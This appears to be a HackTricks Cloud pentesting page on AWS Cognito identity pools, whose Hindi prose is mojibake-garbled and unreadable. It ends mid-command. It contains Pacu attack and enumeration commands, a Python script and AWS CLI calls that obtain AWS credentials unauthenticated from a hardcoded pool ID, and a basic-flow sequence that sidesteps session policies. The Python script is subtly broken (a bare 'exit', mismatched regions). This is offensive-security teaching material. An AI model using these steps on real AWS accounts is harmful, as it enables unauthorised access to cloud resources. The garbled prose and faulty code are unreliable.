# рдХреЛрдЧреНрдирд┐рдЯреЛ рдЖрдИрдбреЗрдВрдЯрд┐рдЯреА рдкреВрд▓

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks_live**](https://twitter.com/hacktricks_live)** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

## рдореМрд▓рд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

рдЖрдИрдбреЗрдВрдЯрд┐рдЯреА рдкреВрд▓ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рднреВрдорд┐рдХрд╛ рдирд┐рднрд╛рддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ рдЖрдкрдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ **рдЕрд╕реНрдерд╛рдпреА рдкреНрд░рдорд╛рдгрд┐рдХрддрд╛** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рддреА рд╣реИред рдпреЗ рдкреНрд░рдорд╛рдгрд┐рдХрддрд╛рдПрдБ Amazon S3 рдФрд░ DynamoDB рд╕рд╣рд┐рдд рд╡рд┐рднрд┐рдиреНрди AWS рд╕реЗрд╡рд╛рдУрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИрдВред рдЖрдИрдбреЗрдВрдЯрд┐рдЯреА рдкреВрд▓ рдХреА рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╡рд┐рд╢реЗрд╖рддрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЗрдирдХрд╛ рд╕рдорд░реНрдерди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЕрдирд╛рдо рдЕрддрд┐рдерд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдФрд░ рд╡рд┐рднрд┐рдиреНрди рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рд╣реИред рд╕рдорд░реНрдерд┐рдд рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛рдУрдВ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

- Amazon Cognito рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреВрд▓
- рдлреЗрд╕рдмреБрдХ, рдЧреВрдЧрд▓, рдЕрдореЗрдЬрд╝рди рд▓реЙрдЧрд┐рди рдФрд░ рдПрдкреНрдкрд▓ рд╕рд╛рде рдореЗрдВ рд╕рд╛рдЗрди-рдЗрди рдЬреИрд╕реЗ рд╕реЛрд╢рд▓ рд╕рд╛рдЗрди-рдЗрди рд╡рд┐рдХрд▓реНрдк
- OpenID Connect (OIDC) рдХреЗ рдЕрдиреБрдкрд╛рд▓рди рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рджрд╛рддрд╛рдПрдБ
- SAML (рд╕реБрд░рдХреНрд╖рд╛ рджрд╛рд╡рд╛ рдЪрд┐рд╣реНрдирд┐рдд рднрд╛рд╖рд╛) рдЖрдИрдбреЗрдВрдЯрд┐рдЯреА рдкреНрд░рджрд╛рддрд╛рдПрдБ
- рдбреЗрд╡рд▓рдкрд░ рдкреНрд░рдорд╛рдгреАрдХреГрдд рдкрд╣рдЪрд╛рдиреЗрдВ
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### рдХреЛрдЧреНрдирд┐рдЯреЛ рд╕рд┐рдВрдХ

рдЖрдИрдбреЗрдВрдЯрд┐рдЯреА рдкреВрд▓ рд╕рддреНрд░реЛрдВ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдкрд╣рд▓реЗ **рдЖрдИрдбреЗрдВрдЯрд┐рдЯреА рдЖрдИрдбреА рдЙрддреНрдкрдиреНрди рдХрд░рдиреА** рд╣реЛрдЧреАред рдпрд╣ рдЖрдИрдбреЗрдВрдЯрд┐рдЯреА рдЖрдИрдбреА **рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╕рддреНрд░ рдХреА рдкрд╣рдЪрд╛рди** рд╣реИред рдпреЗ рдкрд╣рдЪрд╛рди 20 рдбреЗрдЯрд╛рд╕реЗрдЯреНрд╕ рддрдХ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ рдЬрд┐рдирдореЗрдВ 1MB рддрдХ рдХреА рдХреБрдВрдЬреА-рдорд╛рди-рдЬреЛрдбрд╝реА рд╕рдВрдЧреНрд░рд╣реАрдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред

рдпрд╣ **рдЙрдкрдпреЛрдЧреА рд╣реИ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП** (рдЬреЛ рд╣рдореЗрд╢рд╛ рдПрдХ рд╣реА рдЖрдИрдбреЗрдВрдЯрд┐рдЯреА рдЖрдИрдбреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛)ред

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рд╕реЗрд╡рд╛ **рдХреЛрдЧреНрдирд┐рдЯреЛ-рд╕рд┐рдВрдХ** рд╡рд╣ рд╕реЗрд╡рд╛ рд╣реИ рдЬреЛ рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ **рдкреНрд░рдмрдВрдзрд┐рдд рдФрд░ рд╕рдордХрд╛рд▓рд┐рдХ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ** (рдбреЗрдЯрд╛рд╕реЗрдЯреНрд╕ рдореЗрдВ, рд╕реНрдЯреНрд░реАрдореНрд╕ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рднреЗрдЬрдиреЗ рдФрд░ рдПрд╕рдПрдирдПрд╕ рдореИрд╕реЗрдЬ рдореЗрдВ...)ред

### рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), AWS рд╢реЛрд╖рдг рдврд╛рдВрдЪрд╛, рдЕрдм "cognito\_\_enum" рдФрд░ "cognito\_\_attack" рдореЙрдбреНрдпреВрд▓ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЦрд╛рддреЗ рдореЗрдВ рд╕рднреА рдХреЛрдЧреНрдирд┐рдЯреЛ рд╕рдВрдкрддреНрддрд┐рдпреЛрдВ рдХрд╛ рд╕реВрдЪреАрдХрд░рдг рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдХрдордЬреЛрд░ рд╡рд┐рдиреНрдпрд╛рд╕, рдкрд╣реБрдВрдЪ рдирд┐рдпрдВрддреНрд░рдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЧреБрдг, рдЖрджрд┐ рдХреЛ рдзреНрд╡рдЬрд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд┐рд░реНрдорд╛рдг (рдПрдордПрдлрдП рд╕рдорд░реНрдерди рд╕рд╣рд┐рдд) рдФрд░ рд╕рдВрд╢реЛрдзрди рдЙрдЪреНрдЪрддрд╛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ рд╕рдВрд╢реЛрдзрди рдпреЛрдЧреНрдп рдЕрдиреБрдХреВрд▓ рдЧреБрдг, рдЙрдкрдпреЛрдЧреА рдЖрдИрдбреЗрдВрдЯрд┐рдЯреА рдкреВрд▓ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕, рдЖрдИрдбреА рдЯреЛрдХрдиреНрд╕ рдореЗрдВ рдЕрд╕реНрд╡реАрдХрд╛рд░реНрдп рднреВрдорд┐рдХрд╛рдПрдБ, рдЖрджрд┐ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИред

рдореЙрдбреНрдпреВрд▓ рдХреЗ рдХрд╛рд░реНрдпреЛрдВ рдХрд╛ рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП [рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2) рдХрд╛ рднрд╛рдЧ 2 рджреЗрдЦреЗрдВред рд╕реНрдерд╛рдкрдирд╛ рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреЗ рд▓рд┐рдП рдореБрдЦреНрдп [Pacu](https://github.com/RhinoSecurityLabs/pacu) рдкреГрд╖реНрда рджреЗрдЦреЗрдВред

#### рдЙрдкрдпреЛрдЧ

рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд┐рд░реНрдорд╛рдг рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдиреЗ рдФрд░ рдПрдХ рджрд┐рдпреЗ рдЧрдП рдЖрдИрдбреЗрдВрдЯрд┐рдЯреА рдкреВрд▓ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреВрд▓ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕рднреА рдкреНрд░рд┐рд╡реЗрд╕реЗрдХ рд╡реЗрдХреНрдЯрд░реНрд╕ рдХреЗ рдЦрд┐рд▓рд╛рдл cognito\_\_attack рдЙрдкрдпреЛрдЧ рдХрд╛ рдирдореВрдирд╛:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд cognito\_\_enum рдЙрдкрдпреЛрдЧ рдХрд╛ рдЙрджрд╛рд╣рд░рдг рд╡рд░реНрддрдорд╛рди AWS рдЦрд╛рддреЗ рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрдиреЗ рд╡рд╛рд▓реЗ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреВрд▓, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреВрд▓ рдХреНрд▓рд╛рдЗрдВрдЯ, рдкрд╣рдЪрд╛рди рдкреВрд▓, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрджрд┐ рдХреЛ рдПрдХрддреНрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) рдПрдХ CLI рдЯреВрд▓ рд╣реИ рдЬреЛ рдкрд╛рдпрдерди рдореЗрдВ рд╣реИ рдФрд░ рдЬреЛ Cognito рдкрд░ рд╡рд┐рднрд┐рдиреНрди рд╣рдорд▓реЗ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдЕрд╡рд╛рдВрдЫрд┐рдд рдЦрд╛рддрд╛ рдирд┐рд░реНрдорд╛рдг рдФрд░ рдкрд╣рдЪрд╛рди рдкреВрд▓ рдЙрдиреНрдирддрд┐ред

#### рд╕реНрдерд╛рдкрдирд╛
```bash
$ pip install cognito-scanner
```
#### рдЙрдкрдпреЛрдЧ
```bash
$ cognito-scanner --help
```
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП https://github.com/padok-team/cognito-scanner рджреЗрдЦреЗрдВ

## IAM рднреВрдорд┐рдХрд╛рдУрдВ рддрдХ рдкрд╣реБрдВрдЪрдирд╛

### рдЕрдкреНрд░рдорд╛рдгрд┐рдд

рдХрд┐рд╕реА рд╣рдорд▓рд╛рд╡рд░ рдХреЛ Cognito рдРрдк рдореЗрдВ AWS рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХрдорд╛рддреНрд░ рд╡рд╕реНрддреБ рдЬреЛ рдЬрд╛рдирдиреА рд╣реИ, рд╡рд╣ рд╣реИ **рдЖрдИрдбреЗрдВрдЯрд┐рдЯреА рдкреВрд▓ рдЖрдИрдбреА**, рдФрд░ рдЗрд╕ **рдЖрдИрдбреА рдХреЛ рд╡реЗрдм/рдореЛрдмрд╛рдЗрд▓ рдПрдкреНрд▓рд┐рдХреЗрд╢рди** рдореЗрдВ **рд╣рд╛рд░реНрдбрдХреЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдПрдХ рдЖрдИрдбреА рдЗрд╕ рддрд░рд╣ рджрд┐рдЦрддрд╛ рд╣реИ: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (рдЗрд╕реЗ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ)ред

{% hint style="success" %}
**рдЖрдИрдПрдо Cognito рдЕрдкреНрд░рдорд╛рдгрд┐рдд рднреВрдорд┐рдХрд╛ рдЬрд┐рд╕реЗ** рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ `Cognito_<рдЖрдИрдбреЗрдВрдЯрд┐рдЯреА рдкреВрд▓ рдирд╛рдо>Unauth_Role`
{% endhint %}

рдЕрдЧрд░ рдЖрдкрдХреЛ рдХрд┐рд╕реА рдЖрдИрдбреЗрдВрдЯрд┐рдЯреА рдкреВрд▓ рдЖрдИрдбреА рдХреЛ рд╣рд╛рд░реНрдбрдХреЛрдб рдХрд┐рдпрд╛ рдорд┐рд▓рддрд╛ рд╣реИ рдФрд░ рдпрд╣ рдЕрдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рддреЛ рдЖрдк AWS рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
рдпрд╛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд **aws cli commands** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдПрдХ рдЕрдирдзрд┐рдХреГрдд рдХреЛрдЧреНрдирд┐рдЯреЛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд┐рд╕реА рднреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд░рдЦ рд╕рдХрддрд╛, рднрд▓реЗ рд╣реА рдпрд╣ рдиреАрддрд┐ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХреА рдЧрдИ рд╣реЛ**ред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЦрдВрдб рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВред
{% endhint %}

### рдЙрдиреНрдирдд рдмрдирд╛рдо рдмреЗрд╕рд┐рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рд╡рд╛рд╣

рдкрд┐рдЫрд▓рд╛ рдЦрдВрдб рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрдиреНрдирдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рд╡рд╛рд╣ рдХрд╛ рдкрд╛рд▓рди рдХрд░рддрд╛ рдерд╛ред рдпрд╣ рдкреНрд░рд╡рд╛рд╣ рдПрдХ **рдкреНрд░рддрд┐рдмрдВрдзрдХ** [**рд╕рддреНрд░ рдиреАрддрд┐**](../../aws-basic-information/#session-policies) рдХреЛ рдЖрдИрдПрдПрдо рд░реЛрд▓ рд╕рддреНрд░ рдЬрд┐рдирд░реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╕рддреНрд░ рд▓рдЧрд╛рддрд╛ рд╣реИред рдпрд╣ рдиреАрддрд┐ рдХреЗрд╡рд▓ рд╕рддреНрд░ рдХреЛ [**рдЗрд╕ рд╕реВрдЪреА рд╕реЗ рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рджреЗрдЧреА**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services) (рднрд▓реЗ рд╣реА рд░реЛрд▓ рдХреЛ рдЕрдиреНрдп рд╕реЗрд╡рд╛рдУрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛ).

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕реЗ рдЫрд▓рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рд╣реИ, рдЕрдЧрд░ **рдЖрдИрдбреЗрдВрдЯрд┐рдЯреА рдкреВрд▓ рдореЗрдВ "рдмреЗрд╕рд┐рдХ (рдХреНрд▓рд╛рд╕рд┐рдХ) рдкреНрд░рд╡рд╛рд╣" рд╕рдХреНрд╖рдо рд╣реИ**, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЙрд╕ рдкреНрд░рд╡рд╛рд╣ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╕рддреНрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ **рдЙрд╕ рдкреНрд░рддрд┐рдмрдВрдзрдХ рд╕рддреНрд░ рдиреАрддрд┐ рдирд╣реАрдВ рд╣реЛрдЧреА**ред

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
рдпрджрд┐ рдЖрдкрдХреЛ рдпрд╣ **рддреНрд░реБрдЯрд┐** рдорд┐рд▓рддреА рд╣реИ, рддреЛ рдпрд╣ **рдореВрд▓ рдлреНрд▓реЛ рдЕрдХреНрд╖рдо (рдбрд┐рдлрд╝реЙрд▓реНрдЯ)** рд╣реЛрдиреЗ рдХреЗ рдХрд╛рд░рдг рд╣реИ

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

IAM рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ рд╕реЗрдЯ рд╣реЛрдиреЗ рдкрд░ рдЖрдкрдХреЛ [рдЬрд╛рдВрдЪрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреМрдирд╕рд╛ рдПрдХреНрд╕реЗрд╕ рд╣реИ](../../#whoami) рдФрд░ [рд╡рд░реНрдЪрд╕реНрд╡ рдХреЛ рдЙрдиреНрдирдд рдХрд░рдиреЗ](../../aws-privilege-escalation/) рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред

### рдкреНрд░рдорд╛рдгрд┐рдд

{% hint style="info" %}
рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ **рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ** рдХреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ **рд╡рд┐рднрд┐рдиреНрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рдПрдВрдЧреА, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдк **рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдЕрдВрджрд░ рд╕рд╛рдЗрди рдЕрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЙрд╕реЗ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдФрд░ рдирдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
{% endhint %}

рдпрд╣рд╛рдБ **рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рднреВрдорд┐рдХрд╛рдПрдБ** рднреА рд╣реЛ рд╕рдХрддреА рд╣реИрдВ рдЬреЛ рдЖрдИрдбреЗрдВрдЯрд┐рдЯреА рдкреВрд▓ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рд╣реЛрдВред

рдЗрд╕рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рдЖрдИрдбреЗрдВрдЯрд┐рдЯреА рдкреНрд░рджрд╛рддрд╛** рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред рдпрджрд┐ рдпрд╣ рдПрдХ **рдХреЛрдЧреНрдирд┐рдЯреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреВрд▓** рд╣реИ, рддреЛ рд╢рд╛рдпрдж рдЖрдк рдореВрд▓ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдирдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦреБрдж рд╕реЗ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред

{% hint style="success" %}
**рдЖрдИрдПрдПрдо рдХреЛрдЧреНрдирд┐рдЯреЛ рдкреНрд░рдорд╛рдгрд┐рдд рднреВрдорд┐рдХрд╛ рдЬреЛ рдмрдирд╛рдИ рдЧрдИ рд╣реИ**, рдЙрд╕реЗ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `Cognito_<Identity Pool name>Auth_Role` рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред
{% endhint %}

рд╡реИрд╕реЗ, **рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг** рдХреА рдЙрдореНрдореАрдж рд╣реИ рдХрд┐ рдЖрдк рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдПрдХ **рдХреЛрдЧреНрдирд┐рдЯреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреВрд▓** рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░ рдЪреБрдХреЗ рд╣реИрдВ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЖрдИрдбреЗрдВрдЯрд┐рдЯреА рдкреВрд▓ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ (рдпрд╣ рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ рдЕрдиреНрдп рдкреНрд░рдХрд╛рд░ рдХреЗ рдЖрдИрдбреЗрдВрдЯрд┐рдЯреА рдкреНрд░рджрд╛рддрд╛рдУрдВ рдХреЛ рднреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ)ред

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# рдкрд┐рдЫрд▓реЗ рдХрдорд╛рдВрдб рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╕реЗ identity_id рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
